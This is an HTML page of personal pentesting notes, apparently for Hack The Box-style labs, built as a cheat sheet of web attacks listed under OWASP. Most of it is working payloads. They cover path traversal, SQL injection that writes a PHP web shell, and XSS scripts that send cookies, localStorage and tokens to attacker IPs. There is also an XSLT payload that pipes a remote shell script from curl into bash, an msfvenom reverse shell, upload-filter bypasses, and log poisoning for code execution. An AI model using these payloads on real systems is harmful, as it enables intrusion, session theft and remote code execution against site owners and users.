<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
    
        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
    <title>Minimalist Webpage</title>

</head>
<body>
    <div id="navbar-container"></div>
    <script src="/H4ckV4ult/components/navbar.js"></script>

    <div class="main-container">
        <div class="sidebar">
                <h3>Quick content</h3>
                <ul id="sidebar-menu"></ul>
        </div>

        <div class="alternative-notion-container">
            <div class="alternative-notion-header">
                <h1>OWASP</h1>
                <p>The OWASP Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.</p>
            </div>

            <div class="alternative-notion-body">
                <h2 id="Enumeration">Enumeration</h2>
                <ul>
                    <h3>Directory fuzzing</h3>
                    <pre><code class="language-bash">feroxbuster -u https://10.X.X.X/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --dont-filter -C 404</code></pre>
                    <p>In case certificates annoy you</p>
                    <pre><code class="language-bash">feroxbuster -k -u https://10.X.X.X/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</code></pre>
                    <p>Filtering status code</p>
                    <pre><code class="language-bash">-C 404</code></pre>
                </ul>

                <h3> Virtual Host (Subdomain) Enumeration (Now using CAIDO)</h3>
                <ul>
                    <p> In some cases it would be necessary to enumrate subdomains so we can use wfuzz. We use --hl 234 (Which is the code) in case there are multiple request with the same code </p>
                    <pre><code class="language-bash">wfuzz -c --hc 404 -t 200 --hl 234 -w /usr/share/wordlists/dirb/small.txt -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb"
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.academy.htb/
gobuster vhost -u http://inlanefreight.htb:53137 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain</code></pre>
                    <p> In case that the server responds equally for real subdomains and for not real subdomains we can use the following script that compare the hash of the requests to identify possible true subdomains </p>
                    
                    <h3>Remember that eventhough a web folder returns forbidden you can enumerate inside of it and you may found something interesting. Try out with different dictionaries</h3>
                    <p>Useful subdomain worlist for enumeration are: <a class="notion-link" href="https://github.com/n0kovo/n0kovo_subdomains">n0kovo_subdomains</a> or <b>seclists/Discovery/DNS/subdomains-top1million-5000.txt</b> </p>
                </ul>

                <h2>Exploitation</h2>
                <ul>
                </div>
                        <h2 id="LFI: Local File Inclusion">LFI: Local File Inclusion</h2>
                        <ul>
                            <h3>Basic path traversal payloads</h3><pre><code class="language-url">http://.../index.php?language=../../../../etc/passwd
http://.../index.php?language=/../../../../etc/passwd
http://.../index.php?language=....//....//....//....//etc/passwd
http://.../index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
http://.../index.php?language=./languages/../../../../etc/passwd
http://...index.php?language=/etc/passwd%00.php</code></pre>

                            <p>Remember that you might use double encoding, since "." or "/" are sanitized using php or others...</p>
                            <pre><code class="language-bash">%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%252F</code></pre>
                            

                            <h3>Local File Inclusion using UNICODE chars</h3>
                            <p>Normally there are sanitizations that prevent for LFI but in some cases you could be able to bypass them by using UNICODE chars take a look at <a class="notion-link" href="https://book.hacktricks.wiki/en/pentesting-web/unicode-injection/unicode-normalization.html"> Hacktricks</a></p>
                            <pre><code class="language-bash">%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/passwd</code></pre>    
                            
                            <h3>Hidden parameters</h3>
                            <ul>
                                <p>It's posible that you find a website which has some hidden parameters. For example an index.php which is practically empty but that it contains a hidden parameter</p>
                                <p>Using the following wordlist you'll be able to figure out. CAIDO is the best option to perform the FUZZING</p>
                                <p><b>Parameter wordlist</b> -> /home/kali/Desktop/Academy/file_inclusion/burp-parameter-names.txt </p>
                                <p><b>LFI wordlist</b>  -> <a>/usr/share/seclist/Fuzzing/LFI/LIF-Jhaddix.txt</a></p>
                            </ul>
                        
                        </ul>

                        <h2 id="RFI: Remote File Inclusion">RFI: Remote File Inclusion</h2>
                        <ul>
                            <p>Normally if you found an LFI you also be able to exploit an RFI</p>
                            <p>Create a simple php script to execute commands</p>
                            <pre><code class="language-bash">echo '&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php</code></pre>
                            <p>Host the previous file and perform a request to your server to execute the command</p>
                            <p>It is important to serve the parameter using & since if not it will fail. The reason it is beacause you can't nest multiple parameters</p>
                            http://192.168.1.2:8080/index.php?language=http://10.10.11.14:5555/shell.php&cmd=id
                        </ul>

                        <h2 id="SQL injection">SQL injection</h2>
                        <ul>
                            <p> Basic payloads</p>
                            <pre><code class="language-sql">'+OR+1=1--
    ' OR 1=1; --
    ' OR '1'='1
    " OR "1"="1" --
    ' OR 1=1 --
    ' OR 1'='1
    ' --</code></pre>
                    <h3>Automate using sqlmap</h3>
                    <div class="banner">
                        <a class="cherry-banner" href="/H4ckV4ult/pages/protocols/sqlmap.html">
                            <h2>  Check for more information ↗️</h2>
                        </a>
                    </div> 

                    <h3>Union select payloads</h3>
                    <ul>
                        <p>After everything remember that all this payloads have variants</p>
                        <pre><code class="language-sql">cn') UNION ...
cn' UNION select 1,2,3,4 --
cn' UNION select 1,2,3,4 -- -
cn' UNION select 1,2,3,4 #</code></pre>
                        <p>Identify the number of colums. Remember to try diferent numbers of columns untill you get no errors</p>
                        <pre><code class="language-sql">cn' UNION select 1,2,3,4--</code></pre>
                        <p>Once you have a right number you can start injecting </p>
                        <pre><code class="language-sql">cn' union select 1,current_user(),3,4#</code></pre>

                        <h4>Information gathering</h4>
                        <ul>
                            <p>Show all databases</p>
                            <pre><code class="language-sql">SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA; # Example
cn' UNION select 1,SCHEMA_NAME,3,4 from INFORMATION_SCHEMA.SCHEMATA-- </code></pre>
                            <p>Show current database</p>
                            <pre><code class="language-sql">SELECT database(); #Example
cn' UNION select 1,database(),3,4--</code></pre>
                            <p>Show tables</p>
                            <pre><code class="language-sql">SELECT TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES #Example
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'--</code></pre>    
                            <p>Show column names</p>        
                             <pre><code class="language-sql">SELECT COLUMN_NAME,TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="users"; #Example
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'--</code></pre>    
                            <p>Show data</p>
                            <pre><code class="language-sql">cn' UNION select 1,username,password,4 from database.users --</code></pre>        
                        </ul>
                    </ul>

                    <h3>Reading local files</h3>
                    <ul>
                        <p>Checking permissions</p>
                        <pre><code class="language-sql">cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- </code></pre>  
                        <p>Reading files</p>
                        <pre><code class="language-sql">SELECT LOAD_FILE('/etc/paswd');</code></pre>  
                    </ul>

                    <h3>Writting local files</h3>
                    <ul>
                       <p>Checking permissions. If value is empty means that we can write any file. If value contains a fixed path means </p>
                        <pre><code class="language-sql">SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv" #Example
cn' UNION SELECT 1,variable_name,variable_value,5 FROM information_schema.global_variables where variable_name="secure_file_priv" --</code></pre>  
                        <p>Writting files using SELECT</p>
                        <pre><code class="language-sql">cn' union select "",'&lt;?php system($_GET["cmd"])?&gt;',"","" into outfile '/var/www/html/shell4.php'#</code></pre>   
                    </ul>    
                    <h3> Blind SQL injection </h3>
                    <ul>
                    Rememer to intercept the requests since in this case the injection has been made in the cookie.
                    In this case it has been detected that if the query was valid a string was displayed on the screen.
                    To check if a table exists we can use the following command
                    <pre><code class="language-sql">' AND (SELECT 'a' FROM users LIMIT 1)='a</code></pre>
                    We used the following query to check letter by letter the password
                    <pre><code class="language-sql">' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</code></pre>
                    </ul>

                    <h3> Situations</h3>
                    <ul>
                        It is possible that to determine which parameter is injectable within the union we have to
                        insert text in any of them trying the following way. If we can make it not jump
                        no error would mean that this parameter is injectable   
                        <pre><code class="language-sql">'+UNION+SELECT+NULL+'text'--</code></pre>
                    </ul>    
                    <ul>
                    
                    <h2 id="LDAP injection">LDAP injection</h2>
                    <ul>
                    <p>LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input.</p>
                    <p>In case you found a place where you can test your injection there are several methods</p>
                    <pre><code class="language-powershell">*                    #Shows all registers
a*                   #Shows all register that start with a
aa*                  #Sometimes helps to show more registers. Remember to check for all letters
USER)(description=a* #Check if the first letter of description field starts with a. Useful for blind LDAP injection. It may fail if the char "*" is present
</code></pre>
                    </ul>
                        <h2 id="XSS: Cross Site Scripting">XSS: Cross Site Scripting</h2>
                        <ul>
                            <p>Remember to try all diferent inputs to detect XSS</p>
                            <h3>Links of interes</h3>
                            <ul>
                                <li> <a class="notion-link" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#other-useful-attributes"> XSS Cheatsheet</a> <br> </li>
                                <li> <a class="notion-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md"> Payload all the things</a></li>
                            </ul>

                            <p>Types of XSS</p>
                            <ul>
                                <li><b>Stored XSS</b>: The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)</li>
                                <li><b>Reflected XSS</b>:Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)</li>
                                <li><b>DOM-based XSS</b>:Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server </li>
                            </ul>
                            
                            <h3>Common payloads</h3>
                            <pre><code class="language-js">&lt;script&gt; alert('') &lt;/script&gt;</code></pre>
                            <pre><code class="language-js">&lt;img src =q onerror=alert()&gt;</code></pre>
                            <pre><code class="language-js">&lt;link&gt; rel="stylesheet" href="javascript:alert('');"&gt;</code></pre>
                            <p>Some webs use frames to manage their forms. Showing windows origin we will discover the real address of the site</p>
                            <pre><code class="language-js">&lt;script&gt; console.log(window.origin) &lt;/script&gt;</code></pre>
                            <p>Even in case a web is blocking some key words </p>
                            <pre><code class="language-js">&lt;script&gt; print() &lt;/script&gt;</code></pre>
                            <br>
                            <b>In case any of these payloads are working you can try with more advanced ones in the following <a class="notion-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications">link</a> </b>

                            <h3>Automating XSS detection</h3>
                            <ul>
                                <p>You can use tools like xsstrike in order to find xss in certain website <b>Important to pass the parameter</b></p>
                                <pre><code class="language-js">python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" </code></pre>
                                
                            </ul>

                            <h3>Cookie harvesting</h3>
                            <ul>
                            <p>Once you have identified an XSS attempt to capture cookies</p>
                            <pre><code class="language-js">&lt;img src="1" onerror=fetch("http://10.10.14.22:8082/"%2Bdocument.cookie)&gt;</code></pre>

                            <p>Some killer payloads</p>
                            <pre><code class="language-js">'&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;    
"&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;    
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
&lt;script&gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();&lt;/script&gt;     
&lt;script&gt;$.getScript("http://OUR_IP")&lt;/script&gt;    </code></pre>    

                            <p>Other data grabbing payloads</p>
                            <pre><code class="language-js">&lt;script&gt;document.location='http://localhost/XSS/grabber.php?c='+document.cookie&lt;/script&gt;
&lt;script&gt;document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')&lt;/script&gt;
&lt;script&gt;new Image().src="http://localhost/cookie.php?c="+document.cookie;&lt;/script&gt;
&lt;script&gt;new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');&lt;/script&gt;</code></pre>
                            </ul>    
                            
                            
                            <h3>Situations</h3>
                            <ul>
                            <h4>Adding parameter</h4>
                            <ul>
                            In case you find that parameters are passed through the URL you can try adding a new parameter and injecting the code there since it is not sanitized. 
                            Here what has been done is to close the select and inject the code there.
                            <pre><code class="language-js">https://URL.com/product?productId=2&storeId=&lt;/select&gt;&lt;svg onload=alert(1)&gt;</code></pre>
                            </ul>
                            
                            <h4>Cookie harvesting</h4>
                            <ul>
                            <p>In case you find out that XSS stored is available in a website you can run the following code in order to capture diferent parameters from the user who visit the affected website. Capture it using a python server</p>
                            <pre><code class="language-js">&lt;script&gt;
        // Crear un objeto XMLHttpRequest para enviar la información al servidor
        var xhr = new XMLHttpRequest();
        
        // Recopilar información del navegador
        var userAgent = navigator.userAgent;  // Información del navegador
        var referer = document.referrer;  // Referer de la página
        var url = window.location.href;  // URL actual
        var cookies = document.cookie;  // Cookies del navegador
        var localStorageData = JSON.stringify(localStorage);  // Datos de localStorage
        var sessionStorageData = JSON.stringify(sessionStorage);  // Datos de sessionStorage
        var screenWidth = screen.width;  // Ancho de la pantalla
        var screenHeight = screen.height;  // Alto de la pantalla

        // Recopilar todos los datos en una cadena de consulta
        var data = "userAgent=" + encodeURIComponent(userAgent) +
                "&referer=" + encodeURIComponent(referer) +
                "&url=" + encodeURIComponent(url) +
                "&cookies=" + encodeURIComponent(cookies) +
                "&localStorage=" + encodeURIComponent(localStorageData) +
                "&sessionStorage=" + encodeURIComponent(sessionStorageData) +
                "&screenWidth=" + encodeURIComponent(screenWidth) +
                "&screenHeight=" + encodeURIComponent(screenHeight);

        // Enviar los datos al servidor usando un GET
        xhr.open("GET", "http://10.8.0.22:8080/" + data, true);
        xhr.send();
    &lt;/script&gt;
    </code></pre>
    </ul>

                        <h4> Avoiding WAF</h4>
                        <ul>
                            In other situations where the WAF blocks most of the tags, a brute force attack can be carried out to try the tags that are allowed. In the links above you will find a list of tags and attributes.
                        </ul>    
                        </ul>
                        </ul>
                        <h2 id="Command Injection">Command Injection</h2>
                        <ul>
                            <h3>Situations</h3>
                            <p>In case you are trying to inject code and you know that in the background there is a bash file which will reciep your command you can try to use</p>
                            <p><b>;</b> to stop the current command and execute the following and <b>#</b> to comment the rest</p>
                            <pre><code class="language-bash">/etc/passwd; whoami #</code></pre>
                        </ul>
                        <h2 id = "SSTI: Server Side Template Injection" >SSTI: Server Side Template Injection</h2>
                        <ul>
                            <p>All payloads can be found <a class="notion-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">Here</a></p>
                            <p>Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages</p>
                        </ul>

                        <h2 id = "XXE: XML external entity" >XXE: XML external entity</h2>
                        <ul>
                            <p>Consists in a vulnerability that occurs when an aplicaciotn process XML without disabling external entities, allowing an attacker to manipulate how data is interpreted</p>
                            <pre><code class="language-js">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [
&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]>
&lt;user&gt;
  &lt;name&gt;&xxe;&lt;/name&gt;
&lt;/user&gt;</code></pre>
                        </ul>

                        <h2 id = "XSLT Injections" >XSLT Injections</h2>
                        <ul>
                            <p><b>XSL</b> -> Language designed to transform and present XML documents</p>
                            <p><b>XSLT (XSL Transformations) -> Language based on XML which allows to transform XML documento into another format</b></p>
                            <p><b>EXSLT (Extensions to XSLT) -> Collection of comunity extensions for XSLT</b></p>

                            <p>In some environments if a web/application admits XSLT transforations an attack may be able to use malicious XSL temapltes to inject code or read local files, Here you have some payloads </p>
                            <p>Vendor identification</p>
                            <pre><code class="language-XML">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"&gt;
    &lt;body&gt;
        &lt;br/&gt; Version: &lt;xsl:value-of select="system-property('xsl:version')" /&gt;
        &lt;br/&gt; Vendor: &lt;xsl:value-of select="system-property('xsl:vendor')" /&gt;
        &lt;br/&gt; Vendor URL: &lt;xsl:value-of select="system-property('xsl:vendor-url')" /&gt;
    &lt;/body&gt;
&lt;/html&gt;
                            </code></pre>

                            <p>Command injection</p>
                            <pre><code class="language-XML">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;xsl:stylesheet
    version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exslt="http://exslt.org/common"
    extension-element-prefixes="exslt"&gt;

  &lt;xsl:output method="text"/&gt;

  &lt;xsl:template match="/"&gt;
    &lt;exslt:document href="/var/www/conversor.htb/scripts/shell.py" method="text"&gt;
      &lt;xsl:text&gt;&lt;![CDATA[
#!/usr/bin/env python3
import os
os.system("curl http://10.10.14.17:8000/shell.sh | bash")
]]&gt;&lt;/xsl:text&gt;
    &lt;/exslt:document&gt;
  &lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;</code></pre>
</ul>
                            <h2 id = "File Upload" >File Upload</h2>
                            <ul>
                                <p>In case you found a method of file upload which can be exploited. (Normally by know where are located the uploaded files and which is it's name)</p>
                                <p>It's important to note that even though you find the shell in /uploads/shell.php you may not be able to execute that php code</p>
                                <pre><code class="language-php">&lt;?php echo "&lt;pre&gt;" . shell_exec($_GET["cmd"]) . "&lt;/pre&gt;"?&gt;</code></pre>
                                <p>Creation of a malicious GIF file</p>
                                <pre><code class="language-php">echo 'GIF8&lt;?php system($_GET["cmd"]); ?&gt;' > shell.gif</code></pre>
                                <p>Creation of a malicious ZIP file. The resultant file is the shell.jpg</p>
                                <pre><code class="language-php">echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php && zip shell.jpg shell.php</code></pre>
                                <p>Even with msfvenom we are able to create webshells</p>
                                <pre><code class="language-php">msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php</code></pre>
                               
                                <p>Then we can execute it using zip://./profile_images/shell.jpg#shell.php&cmd=ids</p>
                                <h3>Laudanum</h3>
                                <ul>
                                    <p>Sometimes it is useful to upload Laudanum shells located at <b>/usr/share/laudanum or /usr/share/antak</b>. Examples of file <b>asp  aspx  cfm  helpers  jsp  php  wordpress</b></p>
                                    <p>Remeber to include your IP in the shell if not you won't be able to use it</p>
                                </ul>

                                <h3>Bypassing common filters</h3>
                                <ul>
                                    <p>In case the validations are in the client side we cant delete them by simply using the developer tools in any browser. Instead if validations are in server side we'll need to find other techniques</p>
                                    <h4>File extensions White/Blacklist</h4>
                                    <ul>
                                        <p>In this case we found that in the server side there is a blacklist of <b>denied extensions</b>. Follow the steps to pwn</p>
                                        <p>Intercept the request where you get the result of "Invalid extension type" or similar</p>
                                        <p>Perform a bruteforce over the extension using the following wordlist<b>(usr/share/wordlist/seclist/Discovery/Web-Content/web-extensions.txt)</b>, in case you coudn't find any valid extension types try with <b>web-extensions-big.txt</b> you can do it though burp or caido</p>
                                        <p>Once you identified which extensions are available to use create a simple code to check which extensions really execute the code (Discard the ones who only show the code itself)</p>
                                        <pre><code class="language-php">&lt;?php echo "hola" ?&gt;</code></pre>
                                        <p>Now that you have identified the correct extension type just upload the webshell and enjoy</p>
                                        <p>Here comes a list of several php extensions that are likely to run php code. <b>Very useful when analizing fuzzing results of web-extensions-big.txt</b></p>
                                        <pre><code class="language-php">.jpeg.php
.jpg.php
.png.php
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
.inc</code></pre>
                                    </ul>
                                    
                                    <h4>MIME-Type</h4>
                                    <ul>
                                        <p>In some ocasions the content of the file will be reviewed in order to know if a file is valid or not. This is usually done by inspecting the first few bytes of the file's content, which contain the File Signature or Magic Bytes</p>
                                        <p>We can take advantage of it by inserting some magic bytes and the begining of the file. For example in order to bypass it type the following bytes to make a file look like a gif</p>
                                        <pre><code class="language-php">GIF8</code></pre>
                                        <p>List of magic bytes, very useful for bypassing content type controls</p>
                                        <pre><code class="language-bash">#Image files
‰PNG\r\n\x1A\n
GIF87a #GIF
GIF89a #GIF
ÿØÿ  #JPEG
BM #BMP
RIFF....WEBP #WEBP

#Languages
&lt;?php #PHP
&lt;?xml #XML
&lt;?xml #XML
&lt;svg #SVG

#Documents
%PDF #PDF
PK #ZIP
Rar!... #RAR

#Binaries
EXE #MZ
.ELF #ELF</code></pre>
                                    </ul>   

                                    <h4>Reverse double injection</h4>
                                    <ul>
                                        <p>In some ocasions the webserver may be configured unproperly and we can abuse it using the following (All these types are included in web-extensions-big.txt) </p>
                                        <pre><code class="language-php">shell.php.jpg</code></pre>
                                    </ul>

                                    <h4>Character injection</h4>
                                    <ul>
                                        <p>There are some chars that we can use to inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.</p>
                                        <pre><code class="language-php">%20 #URL encoding (space)
%0a #URL encoding line feed
%00 #Null byte bypassing extension validation, cut stringsm truncate paths
%0d0a  %0d0a  #Line feed HTTP  (shell.php%00.jpg)
/ #Path traversal
.\  #Relative paths
. #Simple dot
… #Unicode char simple bypass
: #Injecting color before the allowed extension (shell.php:.jpg)</code></pre>
                                    </ul>
                                </ul>

                                <h3>Limited file extensions</h3>
                                <ul>
                                <p>You may find that it is possible that a website only let us upload certain file types and this is not possible to bypass. In this case normally these files would iclude SVG, HTML, XML, and even some image and document files. Here are some examples of how to perform the file upload even with this restrictions</p>
                                <h4>Uploading HTML files</h4>
                                <ul>
                                    <p> Although HTML files can't execute code we are able to insert JS code inside performing some XSS attack</p>
                                </ul>    
                                <h4>Injecting in image Metadata</h4>
                                <ul>
                                    <p>In case the website you are targeting is able to display image metadata you could be able to insert js code inside image metadata and then upload it to the server</p>
                                <pre><code class="language-bash">exiftool -Comment=' "&gt;&lt;img src=1 onerror=alert(window.origin)&gt;' HTB.jpg               
#Now checking for image metadata
exiftool HTB.jpg 
Comment:  "&gt;&lt;img src=1 onerror=alert(window.origin)&gt;</code></pre>
                                </ul>

                                <h4>Injecting in svg images</h4>
                                <ul>
                                    
                                <p>XSS attacks can also be carried with SVG images, along with several other attacks. Scalable Vector Graphics (SVG) images are XML-based, and they describe 2D vector graphics, which the browser renders into an image</p>
                                <p>Example of an .svg file where an alert will be carried out. This example can be used for cookie harvesting as well</p>    
                                <pre><code class="language-html">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;
&lt;svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1"&gt;
    &lt;rect x="1" y="1" width="1" height="1" fill="green" stroke="black" /&gt;
    &lt;script type="text/javascript"&gt;alert(window.origin);&lt;/script&gt;
&lt;/svg></code></pre>       
                                <p>Other malicious attack using can be carried out. With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server</p>    
                                <b style="color: red;">The result of these attacks will be loaded in the same page where the file is used. Don't attempt to locate the file inside the upload directory and execute it from there because it will not work</b>
                                <pre><code class="language-html">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
&lt;svg&gt;&xxe;&lt/svg&gt;</code></pre>    
                                
<p>Even we can use built in php wrappers to convert content of files in base64 which will not be executed in the website and we would be able to read it</p>

<pre><code class="language-html">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt; ]&gt;
&lt;svg&gt;&xxe;&lt;/svg&gt;</code></pre>
                                </ul>

                                <h4>Injecting through filename</h4>
                                <ul>
                                    <p>For example if we introduce certain characthers in the filename, and then the web application attempts to move the uploaded file with an OS command (e.g. mv file /tmp), then our file name would inject the whoami command, which would get executed, leading to remote code execution.</p>
                                    <pre><code class="language-bash">file.jpg||whoami
file$(whoami).jpg
file`whoami`.jpg</code></pre>
                                </ul>

                                <h4>Windows specific attacks</h4>
                                <ul>
                                    <p>One such attack is using reserved characters, such as <b>(|, <, >, *, or ?)</b>, which are usually reserved for special uses like wildcards</p>
                                    <p>Windows reserved names for the uploaded file name, like <b>(CON, COM1, LPT1, or NUL)</b>, which may also cause an error as the web application will not be allowed to write a file with this name.</p>
                                    <p>We can also use the <b>8.3 Filename Convention</b></p>
                                    <ul>
                                        <p>For example, to refer to a file called <b>(hackthebox.txt)</b> we can use <b>(HAC~1.TXT)</b> or <b>(HAC~2.TXT)</b>, where the digit represents the order of the matching files that start with <b>(HAC)</b>.</p>
                                        <p>As Windows still supports this convention, we can write a file called <b>(e.g. WEB~1.CON)</b> to overwrite the <b>web.conf</b> This attack can lead to several outcomes, like causing information disclosure through errors, causing a DoS on the back-end server, or even accessing private files.</p>
                                    </ul>
                                </ul>

                                </ul>    
                            </ul>
                            
                            <h2 id="Log Poisoning">Log Poisoning</h2>
                            <ul>
                                <h3>PHP Session Poisoning</h3>
                                <ul>
                                    <p>In case the website uses PHPSESSID in order to store it's cookies we could remote execute code</p>
                                    <p>Normally the cookie information is located at <b>/var/lib/php/sessions/ (Linux) and C:\Windows\Temp\ (Windows)</b> </p>
                                    <p>Inside these folders cookies stay as <b>/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3</b></p>
                                    <p>So in case you take your cookie and try to include it</p>
                                    <pre><code class="language-url">http://10.10.10.1:8080/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code></pre>
                                    <p>In case any of the parameters listed are under your control you may be able to change it and introduce typical php code execution. Attempt to change it by simple using</p>
                                    <pre><code class="language-url">http://10.10.10.1:8080/index.php?language=session_poisoning</code></pre>
                                    <p>Visit the cookie again using sess_nhhv... and check if parameter was changed. If positive, perform the same but this time with a command execution using php</p>
                                    <pre><code class="language-url">http://10.10.10.1:8080/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code></pre>
                                    <p>Finally visit the cookie again and execute a command of your preference</p>
                                    <pre><code class="language-url">http://10.10.10.1:8080/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id</code></pre>
                                </ul>

                                <h3>Server log Poisoning</h3>
                                <ul>
                                    <p>In this case we must check if we are able to view the logs using a file inclusion.</p>
                                    <p>Apache logs are normally located at <b>/var/log/apache2/access.log, error.log  (Linux)</b> and <b>C:\xampp\apache\logs\ (Windows)</b></p>
                                    <p>Nginx logs are normally located at <b>/var/log/nginx/ (Linux)</b> and <b>C:\nginx\log\</b></p>
                                    <p>In case you are able to read any of them you'll figure out that the User-Agent is also stored there, which is a parameter that we can control</p>
                                    <p>So you'll need to intercept the request and introduce any php code &lt;?php system($_GET['cmd']) ?&gt;</p>
                                    <p>Then send the request </p>
                                    <pre><code class="language-url">http://10.10.10.1:8080/index.php?language=/var/log/apache2/access.log?cmd=id</code></pre>
                                </ul>

                                <h3>Server log Poisoning</h3>
                                <ul>
                                    <p>In this case we must check if we are able to view the logs using a file inclusion.</p>
                                    <p>Apache logs are normally located at <b>/var/log/apache2/access.log, error.log  (Linux)</b> and <b>C:\xampp\apache\logs\ (Windows)</b></p>
                                    <p>Nginx logs are normally located at <b>/var/log/nginx/ (Linux)</b> and <b>C:\nginx\log\</b></p>
                                    <p>In case you are able to read any of them you'll figure out that the User-Agent is also stored there, which is a parameter that we can control</p>
                                    <p>So you'll need to intercept the request and introduce any php code &lt;?php system($_GET['cmd']) ?&gt;</p>
                                    <p>Then send the request </p>
                                    <pre><code class="language-url">http://10.10.10.1:8080/index.php?language=/var/log/apache2/access.log?cmd=id</code></pre>
                                </ul>

                                
                            </ul>
                    </div>
                </ul>
            </div>
        </div>
    </div>
</body>

<script>
        
    function generateMenu(){
        const headers = document.querySelectorAll('.alternative-notion-container h2');
        
        const sidebarList = document.querySelector('#sidebar-menu');

        headers.forEach(header => {

            if (!header.id) return;
            const listItem = document.createElement('li');
            const link = document.createElement('a');
            link.textContent = header.textContent;
            console.log(header.textContent);
            link.setAttribute('href', `#${header.textContent}`);
            listItem.appendChild(link);
            sidebarList.appendChild(listItem);
        });
    }

    // Asegurarse de que ambas funciones se ejecuten después de que todo el contenido esté listo
    window.addEventListener('load', generateMenu);
</script>
</html>